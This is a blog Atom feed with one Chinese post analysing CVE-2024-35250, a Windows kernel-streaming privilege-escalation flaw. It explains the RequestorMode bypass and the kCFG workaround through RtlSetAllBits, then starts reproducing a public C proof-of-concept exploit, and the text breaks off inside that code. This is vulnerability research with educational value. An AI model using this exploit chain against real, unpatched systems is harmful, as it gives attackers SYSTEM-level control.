<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ixout&#39;s blog</title>
  
  
  <link href="https://ixout.github.io/atom.xml" rel="self"/>
  
  <link href="https://ixout.github.io/"/>
  <updated>2025-04-09T09:07:48.859Z</updated>
  <id>https://ixout.github.io/</id>
  
  <author>
    <name>ixout</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2024-35250分析</title>
    <link href="https://ixout.github.io/posts/51238/"/>
    <id>https://ixout.github.io/posts/51238/</id>
    <published>2025-04-07T14:31:18.000Z</published>
    <updated>2025-04-09T09:07:48.859Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2024-35250是DEVCORE发现的一个可利用性极高的内核提权漏洞(发现者是著名大佬Angelboy)</p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35250">微软公开的介绍</a></p><p>也可以阅读Angelboy大佬的文章<a href="https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/">Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I | DEVCORE</a></p><h1 id="内核流式传输"><a href="#内核流式传输" class="headerlink" title="内核流式传输"></a>内核流式传输</h1><p>在进行漏洞分析之前需要先了解一些前置知识</p><p>Windows内核流式传输框架(Windows Kernel Streaming Framework)是Windows操作系统中用于处理实时多媒体数据流的核心组件</p><p>当打开摄像头、开启音效以及麦克风等音频设备时，系统需要将这些设备中的声音、影像等相关数据读取到 RAM 中, 这时就会用上内核流式传输框架</p><p>内核流有三种多媒体驱动模型:</p><ul><li>端口类</li><li>AVStream</li><li>流类(已经过时, 现代设备基本不会采用该模型)</li></ul><p><strong>端口类</strong></p><p>主要用于音频硬件驱动(如声卡等)</p><p>由微软提供端口驱动（Port Driver），处理通用音频功能（如混音、格式转换）。硬件厂商只需实现微型端口驱动（Miniport Driver），专注于硬件控制。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/5.png" alt=""></p><p><strong>AVStream</strong></p><p>适用于视频采集、流媒体处理（如摄像头、视频捕获卡）</p><p>取代了旧版 <strong>KS（Kernel Streaming）</strong> 框架，提供更现代的驱动模型。</p><p>支持即插即用（PnP）、电源管理，简化了过滤器（Filter）和管脚（Pin）的实现。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/623423423.png" alt=""></p><h2 id="设备交互"><a href="#设备交互" class="headerlink" title="设备交互"></a>设备交互</h2><p>对于这类设备其实交互与普通设备并没有太大区别, 同样是通过CreateFile打开设备获得句柄进行操作</p><h3 id="设备路径"><a href="#设备路径" class="headerlink" title="设备路径"></a>设备路径</h3><p>但区别在于他们的名字并不像<code>\Devcie\NamedPipe</code> 这样，而是会像下面这样的路径 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\\hdaudio#subfunc_01&amp;ven_8086&amp;dev_2812&amp;nid_0001&amp;subsys_00000000&amp;rev_1000#6&amp;2f1f346a&amp;0&amp;0002&amp;0000001d#&#123;6994ad04-93ef-11d0-a3cc-00a0c9223196&#125;\ehdmiouttopo</span><br></pre></td></tr></table></figure><p>组成成分</p><ol><li><p>前缀 <code>\\?\</code></p><p>表示使用 Windows 的扩展长度路径格式（支持超长路径名）</p></li><li><p>设备类型标识</p><p><code>hdaudio</code>：表示设备为 <strong>高清音频控制器</strong>（如 Intel HD Audio）</p><p>类似还有：</p><ul><li><code>usb#vid_xxxx&amp;pid_xxxx</code>（USB 摄像头）</li><li><code>pci#ven_xxxx&amp;dev_xxxx</code>（PCI 视频采集卡）</li></ul></li><li><p>硬件标识符</p><p><code>ven_8086</code>：厂商 ID</p><p><code>dev_2812</code>：设备型号</p><p><code>nid_0001</code>：节点 ID</p></li><li><p>GUID 部分</p><p><code>&#123;6994ad04-93ef-11d0-a3cc-00a0c9223196&#125;</code>：Windows 定义的设备接口类 GUID（此处是 <strong>KSCATEGORY_AUDIO</strong>，表示音频设备）</p><p>其他常见 GUID：</p><ul><li>摄像头：<code>&#123;65E8773D-8F56-11D0-A3B9-00A0C9223196&#125;</code></li><li>视频采集：<code>&#123;53172480-4791-11D0-A5D6-28DB04C10000&#125;</code></li></ul></li><li><p>功能端点</p><p><code>ehdmiouttopo</code>：表示设备的特定功能端点（此处是 HDMI 音频输出拓扑）</p></li></ol><h3 id="枚举设备"><a href="#枚举设备" class="headerlink" title="枚举设备"></a>枚举设备</h3><p>由于硬件配置、厂商 ID、设备实例 ID 等差异，音频/视频设备的路径（如 <code>\\?\hdaudio#...</code>）是动态生成的，<strong>不能硬编码</strong>在代码中</p><p>要使用 Windows 提供的设备管理 API（如 <code>SetupDi*</code> 系列函数）动态获取设备路径</p><p><code>SetupDi*</code>系列核心api</p><ol><li><p><strong><code>SetupDiGetClassDevs</code></strong>获取指定设备类别（如音频、摄像头）的所有设备列表。</p><p>参数：</p><ul><li><code>ClassGuid</code>：设备类别的 GUID（如 <code>KSCATEGORY_AUDIO</code>）。</li><li><code>Flags</code>：控制枚举范围（如 <code>DIGCF_PRESENT</code> 只枚举当前连接的设备）。</li></ul></li><li><p><strong><code>SetupDiEnumDeviceInterfaces</code></strong>遍历设备列表，获取每个设备的接口信息（包括设备路径）。</p></li><li><p><strong><code>SetupDiGetDeviceInterfaceDetail</code></strong>获取设备的详细路径（即 <code>\\?\hdaudio#...</code> 格式的字符串）。</p></li></ol><p>当然也可以直接使用ks简化的api, 快速打开指定类别的第一个可用设备</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Ks.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;KsMedia.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE g_hDevice;</span><br><span class="line">HRESULT hr = KsOpenDefaultDevice(</span><br><span class="line">    KSCATEGORY_VIDEO_CAMERA,</span><br><span class="line">    GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">    &amp;g_hDevice</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>本质还是对 <code>SetupDiGetClassDevs</code> + <code>CreateFile</code> 的封装</p><h3 id="内核流对象"><a href="#内核流对象" class="headerlink" title="内核流对象"></a>内核流对象</h3><p>Windows内核流式传输框架(Kernel Streaming)在启用设备后会在内核中创建关键对象实例</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/7asd123.png" alt=""></p><p><strong>KS过滤器(KS Filter)</strong></p><p>采用类似”黑盒”的设计理念，开发者通过统一接口与过滤器交互</p><p>每个KS过滤器通常代表一个物理设备或设备的特定功能模(不仅限于物理设备，也可以用于虚拟设备或软件层面的处理), 作为数据处理的中心枢纽，所有流数据都要通过过滤器进行处理</p><p>例如: 打开音频设备后会对应到一个音频过滤器，过滤器可能由多个节点组成，节点对流数据进行处理。音频过滤器通常会处理音频数据流，但它可能包含多个子功能（如解码、编码、效果处理等）</p><p><strong>KS引脚(KS Pin)</strong></p><p>作为过滤器的数据输入/输出端点, 必须通过Pin实例才能对Filter进行数据读写操作</p><p>主要作用有:明确区分输入端和输出端, 定义支持的数据格式和传输特性, 控制数据流的方向和行为</p><p><strong>核心属性系统</strong></p><p>所有KS对象(过滤器和Pin)都通过属性系统暴露其功能, 使用GUID标识的属性标识, 例如支持的格式、传输特性等</p><p>开发者可以使用IOCTL_KS_PROPERTY来设置和获取属性，控制设备的行为</p><p><strong>例子</strong></p><p>例如应用程序从视频摄像头读取数据的流程大致如下图</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/8324sada1123mv.png" alt=""></p><ol><li><p><strong>设备初始化</strong>：</p><p>使用<code>CreateFile</code>或<code>KsOpenDefaultDevice</code>获取设备句柄</p></li><li><p><strong>Pin实例创建</strong>：</p><p>在过滤器上创建特定Pin的实例, 获取代表该Pin的独立句柄</p></li><li><p><strong>流配置</strong>：</p><p>使用<code>IOCTL_KS_PROPERTY</code>进行属性设置, 例如视频格式(如MJPG/YUY2), 帧率(如30fps)等</p><p>同时将Pin状态设置为运行(Run)状态</p></li><li><p><strong>数据采集</strong>：</p><p>使用<code>IOCTL_KS_READ_STREAM</code>从Pin读取视频帧数据</p></li></ol><h2 id="内核流式传输架构"><a href="#内核流式传输架构" class="headerlink" title="内核流式传输架构"></a>内核流式传输架构</h2><p>整个内核流式传输架构大致如下图</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/9zxcyuk23890dsa.png" alt=""></p><p>其中包含两个重要的驱动ksthunk.sys与ks.sys</p><h3 id="ksthunk"><a href="#ksthunk" class="headerlink" title="ksthunk"></a>ksthunk</h3><p>内核流式 WOW Thunk 服务驱动程序</p><p>在调用 DeviceIoControl 应用后，在 Kernel Streaming 的入口点 ，但它功能很简单，负责将 WoW64 进程中的 32 位请求转换成 64 位请求，使得下层的驱动就不必为 32 位结构另外处理。</p><h3 id="ks"><a href="#ks" class="headerlink" title="ks"></a>ks</h3><p>内核连接和流架构库</p><p>内核流媒体的核心组件之一，它是内核流媒体的库函数，负责转发 IOCTL_KS_PROPERTY 等请求到对应设备的驱动程序中，同时也会负责处理 AVStream 的相关功能。</p><h3 id="IOCTLKS-的工作流程"><a href="#IOCTLKS-的工作流程" class="headerlink" title="IOCTLKS* 的工作流程"></a>IOCTL<em>KS</em>* 的工作流程</h3><p>当调用 DeviceIoControl 时, 用户的请求处理流程大致就如下图</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/104768123781.png" alt=""></p><p>而到第 6 步时 ks.sys 就会根据请求的 <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure">属性 </a>来决定要交给哪个驱动及处理器来处理请求</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/11asghasd32234.png" alt=""></p><p>最终再转发给相应的驱动程序，如上图最后转发给 portcls 中的 handler 来操作音频设备</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>作者的原文中还详细地描述了漏洞发现的思路与分析过程, 感兴趣可以看作者的文章</p><p>这里我们就直接进行漏洞的介绍了</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>_ETHREAD线程对象有一个字段PreviousMode, 用于标识参数值的来源是用户模式还是内核模式</p><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/previousmode">PreviousMode - Windows drivers | Microsoft Learn</a></p><p>其有两种可能<strong><code>UserMode</code></strong>和<strong><code>KernelMode</code></strong>, 该值会影响内核是否启用某些操作来保障安全性</p><div class="table-container"><table><thead><tr><th style="text-align:left">调用方式</th><th style="text-align:left">PreviousMode 设置</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">用户模式应用调用 <code>NtXxx</code></td><td style="text-align:left">自动设为 <code>UserMode</code></td><td style="text-align:left">系统调用陷阱处理程序（如 <code>syscall</code> / <code>sysenter</code>）会设置 <code>PreviousMode = UserMode</code>。</td></tr><tr><td style="text-align:left">内核驱动调用<code>NtXxx</code></td><td style="text-align:left">保持调用线程的原有值</td><td style="text-align:left">如果线程原本是用户模式调用链的一部分，<code>PreviousMode</code> 可能仍是 <code>UserMode</code>，导致错误。</td></tr><tr><td style="text-align:left">内核驱动调用 <code>ZwXxx</code></td><td style="text-align:left">强制设为 <code>KernelMode</code></td><td style="text-align:left"><code>ZwXxx</code> 是 <code>NtXxx</code> 的包装器，会临时覆盖 <code>PreviousMode</code> 为 <code>KernelMode</code>，避免安全检查。</td></tr></tbody></table></div><p>与之相关有IRP的<strong>RequestorMode</strong>字段, 在内核驱动中常常会用到这个字段决定是否需要对用户的requests做一些额外的安全检查</p><p>很多时候RequestorMode的值就来自于PreviousMode</p><p>那么这个机制就存在一个问题: 即如果用户态发送IRP请求进入内核态后调用了Zw<em>函数, 而Zw\</em>函数本身又发起了一个IRP请求</p><p>此时PreviousMode已经变为KernelMode, 但是后来发起的IRP请求却依然可能包含有用户传递的内容, 从而使用户的请求规避了某些安全检查</p><p>事实上这种情况确实存在</p><p>内核驱动中可以使用 <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest">IoBuildDeviceIoControlRequest</a> 这个方法去创建一个 DeviceIoControl 的 IRP，该函数会创建好 IRP，然后后续去调用 <a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iofcalldriver">IofCallDriver</a>，这样就可以在内核驱动中调用 IOCTL</p><blockquote><p>If the caller supplies an <em>InputBuffer</em> or <em>OutputBuffer</em> parameter, this parameter must point to a buffer that resides in system memory. The caller is responsible for validating any parameter values that it copies into the input buffer from a user-mode buffer. The input buffer might contain parameter values that are interpreted differently depending on whether the originator of the request is a user-mode application or a kernel-mode driver. In the IRP that <strong>IoBuildDeviceIoControlRequest</strong> returns, the <strong>RequestorMode</strong> field is always set to <strong>KernelMode</strong>. This value indicates that the request, and any information contained in the request, is from a trusted, kernel-mode component.</p></blockquote><p>根据微软的文档可以知道, 如果没有特别去设置 RequestorMode 就会直接以 KernelMode 形式去调用 IOCTL</p><h2 id="漏洞所在"><a href="#漏洞所在" class="headerlink" title="漏洞所在"></a>漏洞所在</h2><p>在ks.sys中就存在对<code>IoBuildDeviceIoControlRequest</code>方法的使用</p><p>通过反编译ks.sys可以发现这个函数<code>KsSynchronousIoControlDevice</code>完美符合条件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS __stdcall <span class="title function_">KsSynchronousIoControlDevice</span><span class="params">(</span></span><br><span class="line"><span class="params">        PFILE_OBJECT FileObject,</span></span><br><span class="line"><span class="params">        KPROCESSOR_MODE RequestorMode,</span></span><br><span class="line"><span class="params">        ULONG IoControl,</span></span><br><span class="line"><span class="params">        PVOID InBuffer,</span></span><br><span class="line"><span class="params">        ULONG InSize,</span></span><br><span class="line"><span class="params">        PVOID OutBuffer,</span></span><br><span class="line"><span class="params">        ULONG OutSize,</span></span><br><span class="line"><span class="params">        PULONG BytesReturned)</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-08_222658.png" alt=""></p><p>尽管这并不是一个Zw*函数, 但是RequestorMode却作为一个参数可控</p><p>并且ks.sys中在使用这个函数时, 往往将RequestorMode设置为0</p><p>例如<code>UnserializePropertySet</code></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-08_2232551.png" alt=""></p><p>memmove的第二个参数其实应该是<code>CurrentStackLocation-&gt;Parameters.DeviceIoControl.Type3InputBuffer</code>也就是用户可控的内容</p><p>OutBuffer也来自原先的IRP请求, 也就是说到这里已经拥有了RequestorMode为KernelMode且存在用户可控参数的原语了</p><p>那如何触发<code>UnserializePropertySet</code>函数呢</p><p>在 Kernel Streaming 的 <code>IOCTL_KS_PROPERTY</code> 功能中，为了提高效率</p><p>提供了 <code>KSPROPERTY_TYPE_SERIALIZESET</code> 和 <code>KSPROPERTY_TYPE_UNSERIALIZESET</code> 功能允许用户通过 <strong>单次调用</strong> 与多个 Property 进行操作。</p><p>当我们使用这个功能时，这些请求将被 KsPropertyHandler 函数分解成多个调用</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-08_224117.png" alt=""></p><p>过程如图</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/23312312312312.png" alt=""></p><p>UnserializePropertySet处理又会调用KsSynchronousIoControlDevice 重新做一次 IOCTL，而此时新的 <code>Irp-&gt;RequestorMode</code> 就变成了 KernelMode(0) </p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/24712983712893.png" alt=""></p><h2 id="EoP"><a href="#EoP" class="headerlink" title="EoP"></a>EoP</h2><p>现在已经存在KernelMode下的任意<code>IOCTL_KS_PROPERTY</code>, 现在要做的就开始寻找可触发利用点</p><p>在ksthunk.sys中<code>DispatchIoctl</code>负责对请求进行分发</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-09_103118.png" alt=""></p><p>如果请求不是32位的, 就会调用<code>CKSThunkDevice::CheckIrpForStackAdjustmentNative</code></p><p>其中3080195是IOCTL_KS_PROPERTY的调用号</p><p>而在<code>CKSThunkDevice::CheckIrpForStackAdjustmentNative</code>函数存在如下代码</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-04-09_103612.png" alt=""></p><p>如果是直接从用户态调用这个过程, 那么会检查RequestorMode直接返回错误</p><p>但现在是从内核态发起的调用, 那么就会执行下面的将用户输入作为函数调用, 并且第一个参数可控</p><p>那现在要面对的就是KASLR, SMEP, KCFG等保护</p><p>对于前两者在Windows下解决都不算困难</p><ul><li>KASLR使用<code>EnumDeviceDrivers</code>或<code>NtQuerySystemInformation</code>等api即可获得内核加载基址</li><li>SMEP则直接调用内核代码即可</li></ul><p>CFG保护会检查通过指针间接调用的函数是否在合法的函数表中</p><p> <a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlsetallbits">RtlSetAllBits</a>就是一个能够被利用的函数, 其是 kCFG 中合法的 function，而且也只需要控制一个参数_RTL_BITMAP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTL_BITMAP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG SizeOfBitMap;</span><br><span class="line">    ULONG* Buffer;                    </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> stdcall <span class="title function_">RtlSetAllBits</span><span class="params">(PRTL_BITMAP BitMapHeader)</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span>* Buffer;<span class="comment">//r8</span></span><br><span class="line">  <span class="type">unsigned</span> int64 v2; / rdx</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  Buffer = BitMapHeader-&gt;Buffer;</span><br><span class="line">  v2 = (<span class="type">unsigned</span> int64)(<span class="number">4</span> * (((BitMapHeader &gt; SizeOfBitMap &amp; <span class="number">0x1F</span>) != <span class="number">0</span> ) + (BitMapHeader-&gt;SizeOfBitMap &gt;&gt; <span class="number">5</span>))) &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span>（ v2 )&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Buffer, <span class="number">0xFF</span>u, <span class="number">8</span> * (v2 &gt;&gt; <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> ((v2 &amp; <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">      Buffer[v2 - <span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过这样就不能用替换token的提权方式了, 只能直接修改Token-&gt;Privilege将其全部置位来开启所有权限</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>网络上目前已经有公开的poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PoC Info</span></span><br><span class="line"><span class="comment">--------------------------------------------------------------</span></span><br><span class="line"><span class="comment">Vulnerability:        CVE-2024-35250/CVE-2024-30084</span></span><br><span class="line"><span class="comment">Tested environment:    Windows 11 22h2 Build 22621</span></span><br><span class="line"><span class="comment">Windows 10 20h2 Build 19042</span></span><br><span class="line"><span class="comment">VMWare Workstation 17 Pro</span></span><br><span class="line"><span class="comment">Weakness:        CWE-822: Untrusted Pointer Dereference</span></span><br><span class="line"><span class="comment">Required privileges:    Medium IL</span></span><br><span class="line"><span class="comment">--------------------------------------------------------------</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __STREAMS__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _INC_MMREG</span></span><br><span class="line"><span class="comment">//#define _SEP_TOKEN_PRIVILEGES0xc1b4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _PREVIOUS_MODE0xbaba</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Ksproxy.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ksuser.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ntdllp.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;SetupAPI.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Advapi32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">BOOL res = FALSE;</span><br><span class="line">NTSTATUS status = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> Ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">hDevice = GetKsDevice(KSCATEGORY_DRM_DESCRAMBLE);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _SEP_TOKEN_PRIVILEGES</span></span><br><span class="line"></span><br><span class="line">HANDLE hToken;</span><br><span class="line"><span class="type">uint64_t</span> ktoken_obj = <span class="number">0</span>;</span><br><span class="line">res = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!res)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open current process token\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = GetObjPtr(&amp;ktoken_obj, GetCurrentProcessId(), hToken);</span><br><span class="line"><span class="keyword">if</span> (res != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Current process TOKEN address = %llx\n&quot;</span>, ktoken_obj);</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined _PREVIOUS_MODE</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> Sysproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> Curproc = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> Curthread = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hCurproc = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Leak System _EPROCESS kernel address</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Ret = GetObjPtr(&amp;Sysproc, <span class="number">4</span>, (HANDLE)<span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] System EPROCESS address: %llx\n&quot;</span>, Sysproc);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Leak Current _KTHREAD kernel address</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());</span><br><span class="line"><span class="keyword">if</span> (hThread != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">Ret = GetObjPtr(&amp;Curthread, GetCurrentProcessId(), hThread);</span><br><span class="line"><span class="keyword">if</span> (Ret != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] 